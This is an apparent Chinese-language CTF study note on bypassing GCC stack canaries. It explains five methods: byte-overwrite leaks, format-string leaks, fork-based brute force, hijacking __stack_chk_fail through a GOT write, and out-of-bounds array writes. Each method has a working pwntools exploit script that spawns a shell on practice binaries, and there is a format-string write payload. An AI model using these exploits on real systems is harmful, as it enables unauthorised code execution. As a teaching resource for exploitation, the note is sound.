### canary绕过

#### 在GCC中开启canary保护：

```
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector 禁用保护.
```

#### 原理

- 64位程序的canary大小是8个字节，32位的是4个字节；
- **Canary是以字节\x00结尾**
- 其原理是在一个函数的入口处，先从fs/gs寄存器中获取一个值，**一般**存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置；
- 当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序；
- canary的位置不一定与ebp存储的位置相邻，具体得看程序的汇编操作，不同编译器在进行编译时canary位置可能出现偏差，有可能ebp与canary之间有字节被随机填充

##### 1.覆盖泄露canary

原理：Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。

64位系统中其栈结构如下

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local var       |
        Low     |                 |
        Address
```

###### 例题演示：

查看保护：开启了NX，canary，relro

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712065171579-aac1777d-f8c6-477b-90d2-9c87757b3aa4.png)

F5查看，这里有两个read函数，这里存在栈溢出，可以使用第一个read暴露canary，第二个read构造ROP链获取shell。

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712065330740-3fded8a0-d5a4-4ec2-9cc6-b94f58d37e89.png)

  
使用IDA Pro打开，查看导入表，导出表，string窗口，导入导出表没有需要重点关注的地方。strings有/bin/sh命令行有关的字符串，没有交叉引用，还找到了system函数，可以利用这两部分构造ROP链。

![](https://cdn.nlark.com/yuque/0/2024/webp/40760320/1712065286710-12751d6a-4c31-4cb3-a34f-fa6916b42061.webp)  
  
1、首先暴露canary，buf到canary的距离是(0x240 - 0x8)，高八字节是canary

2、暴露出canary后，继续八字节覆盖ebp

3、查找合适的gadget，构造ROP链。这里因为是64位的系统，传参方式和32位系统不同；32位系统的程序将参数从右到左压入栈中传参，64位系统前六个参数通过rdi，rsi，rdx，rcx，r8，r9传递，从第七个参数开始从右到左压栈传参，只需要找到pop rdi指令，esp就会加8，就可以将原esp处的数据赋值给rdi，完成了参数压栈，再调用system()函数，就可以构造system("/bash/sh")。

小端序说明，数据在[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)里是如何存储的？下表里数据都为16进制

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712065566320-55569755-f367-47bb-8ff2-c8010fe22c97.png)

使用ROPgadget查看rdi地址  
![](https://cdn.nlark.com/yuque/0/2024/webp/40760320/1712065392491-e3c91804-f1ec-458a-9919-77f7e66831ca.webp)

构造payload:

```
from pwn import *
r= process('./pwn4_')
context(terminal = ['tmux','split','-v'])
#r= remote('114.67.175.224',14037)
elf=ELF('./pwn4_')

rdi = 0x400963
bin_sh = next(elf.search(b'/bin/sh'))
system =0x40080c

payload1 = b'a' * (0x240-0x8)
r.sendlineafter("Please leave your name(Within 36 Length):", payload1)
#gdb.attach(r)
r.recvuntil(b'\n')
print("success")
canary = u64(b'\x00'+r.recv(7))
print(hex(canary))
print("-----------")
payload2 = b'a' * (0x210-0x8) +p64(canary)+b'a' * 8 +p64(rdi) +p64(bin_sh)+p64(system)
r.sendlineafter("Please leave a message(Within 0x200 Length):", payload2)
r.interactive()
```

##### 2.格式化字符串泄露

**知识:**格式化字符串漏洞是因为c语言中printf的参数个数不是确定的，参数的长度也不是确定的，当printf把我们的输入当作第一个参数直接输出的时候，我们输入若干格式化字符串，会增加与格式化字符串相对应的参数，会泄露出栈中的内容。

###### 例题演示：

查看文件，发现开启了NX，canary

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712920666519-6c64cadf-5582-4bda-99a5-792b765ff190.png)

查看汇编

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712920878264-dce563e2-280b-4711-a651-7def019cd303.png)

可以看到有两次的输入和输出，并且还存在格式化字符串漏洞

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712920894874-70986e57-0286-4c84-8bf6-bfcf3ffdb0b2.png)

还可以看到有后门函数

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712920933410-186ca743-706b-45ff-9442-0195a5fee043.png)

思路：对于这题可以用格式化字符串计算参数的便宜来泄露canary，第一个输入我们可以输入参数的偏移地址，第二个输入我们可以使用rop构造payload。

gdb动调一下：

输入aaaa，可以看到输入的字符串存在ecx寄存器的位置

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712922562318-f6cf1107-59af-49a2-aa1a-de6d84d57302.png)

图中能看到真实的printf参数的第一个位置和canary的位置。

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1712923164053-0b9e7c15-a0bd-4835-8700-c29764db24d9.png)

经过计算之后可以得到canary的地址是在格式化字符串后的第31个参数

那么现在可以构造payload了

exp:

```
from pwn import*
p=process('./leak_canary')
elf=ELF('./leak_canary')
context(terminal=['tmux','split','-v'])
payload='%31$p' #这里是需要泄露的canary参数位置
p.recvuntil("someting:")  #等到接收完
p.sendline(payload)
p.recvuntil('0x')
canary=int(p.recv(8),16)
print(hex(canary))
print("-------------------------------")
payload=b'a'*100+p32(canary)+b'a'*8+b'a'*4+p32(elf.sym['shell'])
p.send(payload)
p.interactive()
```

下面是我当时对这题的不解之处的解答：

1.为什么要将接收的canary转化成int型：

这主要是因为在程序输出的时候,canary 值会被打印成一个 16 进制字符串的形式。具体步骤如下:

当程序检查栈上的 canary 值时,它实际上是以二进制的形式存储在内存中的。但是当程序将这个 canary 值输出到控制台时,为了方便人类阅读,它会被转换成 16 进制的字符串形式。所以在我们从程序输出中提取 canary 值的时候,得到的就是一个字符串,而不是原始的二进制数据。之所以要转换成字符串形式,是因为直接打印二进制数据对于人类来说非常不直观。16 进制的字符串格式更方便我们理解和处理。为了使用这个字符串形式的 canary 值,我们需要将它转换回整数,使用 int(p.recv(8), 16) 这样的函数来完成这个转换。

2.printf函数遇到canary的\x00不是会停止吗？为什么还能泄露canary：

这是因为,在这个例子中,程序使用的不是 printf 函数,而是一个更底层的 I/O 函数 p.recv(8) 来读取输出。

p.recv(8) 函数会直接从程序的输出缓冲区中读取 8 个字节的数据,而不会受到 \x00 字节的影响。它会将所有 8 个字节的数据原样返回,包括可能存在的 \x00 字节。

相比之下,printf 函数是基于 C 标准库的,它会在遇到 \x00 字节时停止输出。但在这个漏洞利用脚本中,我们没有使用 printf，而是直接读取输出缓冲区,因此可以成功获取完整的 canary 值。

##### 3.one_by_one 爆破泄露

原理：

- 对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。
- 最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。
- 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来。

一般来说，要想知道一个 **64位** 的随机数是多少，我们需要尝试2的64次方次。但是在爆破 **canary** 的场景下，若其长度为 **64位** ，我们也只需要尝试 2^8 *(8-1)=1792次就能猜到目标随机数。

这是什么原因呢？其实 **逐字节爆破** 这个名称本身已经说明了一部分问题：我们的爆破是以字节为单位的，每个字节共需要尝试 **256** 次，总共需要尝试 **7** 个字节（因为首字节必然是 **0x00** ，这是 **Canary** 本身的特点）。

那为什么在爆破 **canary** 时，我们可以逐字节爆破呢？爆破 **canary** 和爆破其他随机数的区别是什么呢？答案其实很简单，因为当我们在爆破某一字节的时候，我们可以很轻易地知道当前字节是否正确。举个例子，假定某程序生成的 **canary** 为： **0x0011223344556677** ，我们想通过爆破的方法知道第 **5** 个字节的值是多少，我们将经历以下过程：

![](https://cdn.nlark.com/yuque/0/2024/webp/40760320/1713022584787-d09e2da0-ec4f-4fcf-b739-52ce54b54e98.webp)

可以看到，图中的方格有三种颜色，其含义分别是：

1. 青色方块：在之前的爆破中已经确定下来的字节。
2. 黑色方块：正在爆破的字节。
3. 橙色方块：还未爆破的字节。

其中，青色方块和黑色方块由我们人为覆盖；橙色方块是内存中的原始数据。由于青色方块是之前的爆破中已经确定下来的，橙色方块是内存中的原始数据，因此青色方块和橙色方块中的字节都是完全正确的（尽管我们不知道橙色方块中的字节具体是多少，但它绝对是正确的）。因此，在尝试的过程中，只有黑色方块中的字节是不确定的，而确定一个字节只需要尝试最多 256 次。

当剩余的 7 字节全部被爆破出来后， canary 也就被爆破出来了。

下文是对于fork函数的详细的讲解

fork函数 ——子进程

[https://xiaoxiami.gitbook.io/linux-server/duo-jin-cheng-bian-cheng/forkhan-shu](https://xiaoxiami.gitbook.io/linux-server/duo-jin-cheng-bian-cheng/forkhan-shu)

###### 例题演示：

checksec检查一下，开启了nx和canary

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713022951500-3f0bec4d-9217-4187-8706-20ba69466250.png)

查一下反汇编，可以看到调用fork，产生子进程

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713023006085-3a29faca-e31b-4b16-9f0b-bb48aeecdadb.png)

可以看到fun函数是存在栈溢出的

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713023139449-676fc02f-4772-41e0-bd10-1350396417eb.png)

getflag函数是一个后门函数

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713023025181-14102e26-66a9-402e-b8c4-12cd86dcf632.png)

可以看到canary与esp的偏移量，canary在esp-0x14

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713026236145-3f4fb0d5-a8f9-4aae-a200-6dce49151cb7.png)

那么我们就可以构造我们需要的exp了

exp：

```
from pwn import*
context(terminal=['tmux','split','-v'])
p = process('./one_canary')
canary='\x00'
addr=0x80491f6
p.recvuntil('welcome\n')
for j in range(3):
    for i in range(256):
        p.send('a'*24+canary+chr(i))
        a=p.recvuntil('welcome\n')
        if b'recv' in a:
            canary+=chr(i)
            break

payload=flat('a'*100,canary,'a'*0xc,p32(addr))
p.sendline(payload)
p.interactive()
```

结果：

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713026396387-1ce67871-2f3a-4f6e-ac7f-09e23c5e4570.png)

##### 4.劫持_stack_chk_fail

原理：

在开启canary保护的程序中，如果canary不对，程序会转到stack_chk_fail函数执行，stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改GOT表中的值。

使用条件：存在格式化字符串漏洞

###### 例题演示：

检查，64位，开启了canary和nx

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713080560387-305c6e9b-36b3-4548-ab2b-086170104a82.png)

64位ida载入，检索字符串的时候发现了后面函数，shell_addr=0x400626

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713080689809-8fab34ae-7adf-4b7f-a815-08d02e24e7b6.png)

main函数，可以看到有输入，有溢出但是只能够覆盖到rbp，还存在格式化字符串漏洞

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713080743679-e0aef337-e9b4-4376-9d99-0c4794b25bda.png)

查看程序的汇编可以看到，如果程序检查canary不通过，就会去执行___stack_chk_fail

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713080880258-e40b46e3-8b0e-4bfb-8bc9-a0a4558f3133.png)

思路：

由于我们已经获取了后门函数的地址，所以我们可以利用格式化字符串漏洞可读可写的特性，将___stack_chk_fail的地址覆写成后门函数地址，然后故意去溢出破坏canary的值，让其不通过检查，就能去调用后门函数获取shell了。

这里总结了一些格式化字符：

```

要想利用格式化字符串漏洞，首先要了解格式化字符
其中格式化字符有：

%c：输出字符，配上%n可用于向指定地址写数据。

%d：输出十进制整数，配上%n可用于向指定地址写数据。

%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。

%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。

%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。

%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。
```

具体的详解可以看这一篇：[https://www.anquanke.com/post/id/194458](https://www.anquanke.com/post/id/194458)

现在来看一下我们输入的参数在栈上的偏移量，可以看到含有61616161的就是我们要找的位置。

偏移量也就是6。

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713081373931-17c4616f-3a01-4c2d-939c-33fa8705f719.png)

我们需要将__stack_chk_fail的got地址改写为后门函数地址，在别处文章中了解到：由于64位程序，printf在输出大量字符时有时会异常，就像前面一次性读入大量字符会异常一样，printf在一次性输出这么大量的字符时也会出现异常。所以解决办法便是一个一个字节来做出修改或者两个两个来，具体的修改方法我上面给的那个链接里也有说明。

上面找到的后门函数地址是shell_addr=0x400626,我们一次修改两字节，所以按照两个字节一拆分就是0x0040和0x0626

```
payload = "%64c%9$hn%1510c%10$hnaaa" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)
```

64（0x40）：对应backdoor函数地址的高两字节0x0040
由于格式化字符串%64c%9hn%1510c%10$hnaaa占用了24个字节，根据64位程序，24/8=3,所以偏移是6+3=9，配合上$hn使用构成%9$hn,将64（0x40）写入偏移为9的位置，对应的是__stack_chk_fail+2

- 1510：1510+64=1574=0x626，对应backdoor函数地址的低两字节0x0626

- 在偏移9的基础上加上p64(__stack_chk_fail+2)地址的一字节，即偏移为10

- aaa：填充作用，随便写，使之为8的倍数让栈对齐

- p64(__ stack_chk_fail+2) + p64(__stack_chk_fail) ：将backdoor函数地址分为高两个字节和低两字节进行写入。

```
from pwn import *

r=process('./hijack_got')

elf = ELF('./hijack_got')

__stack_chk_fail=elf.got['__stack_chk_fail']

payload = "%64c%9$hn%1510c%10$hnaaa" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)

r.sendline(payload)

r.interactive()
```

结果：

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713081889053-38560d27-abe6-4136-ab48-95f4fa79bcc0.png)

##### 5.数组下标越界

###### 例题演示：

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713084202874-f538887e-6702-463e-b60b-2431fafa403d.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713083875740-2a861e91-4d20-4bf6-84c8-fefc6169ac3f.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713084115054-79a9e747-bc56-4fdc-8a17-2af2d0a92719.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713084130722-2a45a3c8-865b-46af-8bea-7fdfa1e7dd12.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713083908585-371fb688-9f28-4e48-bd66-9a0215c293f9.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713083938087-988f6da5-f0ed-4d9d-bce4-d9fdfb41e2d5.png)

开了栈溢出保护和堆栈不可执行，看main，这里name是到bss段的，最后saybye的时候打印出来，重点看中间的程序，发现有数组：C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越界了，那么它会自动接着那块内存往后写。

漏洞利用：继续往后写内存，这里就可以通过计算，写到我们的ret位置处，这样就可以直接getshell

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713084328422-881ab232-c4d3-4b7b-91b6-dab17f8e7d26.png)

这里我引用一个图来讲解一下，ret位置就相当于位于下标为6的数组的位置，在这个题目里esp到ebp的空间是0x38。53/4=13，可以得出ret的地址是在下标为14的位置。

![](https://cdn.nlark.com/yuque/0/2024/png/40760320/1713084720102-60cfaa8e-9c15-45a0-bd3b-9f171d3e863f.png)

exp:

```
from pwn import *
context.log_level = 'debug'
context(terminal = ['tmux','split','-v'])
context(arch='i386', os='linux')
local = 1
elf = ELF('./homework')
p = process('./homework')
p.recvuntil("What's your name? ")
p.sendline("Your father")
p.recvuntil("4 > dump all numbers")
p.recvuntil(" > ")
p.sendline("1")
p.recvuntil("Index to edit: ")
p.sendline("14")
p.recvuntil("How many? ")
system_addr = 0x080485FB
p.sendline(str(system_addr))
p.interactive()
```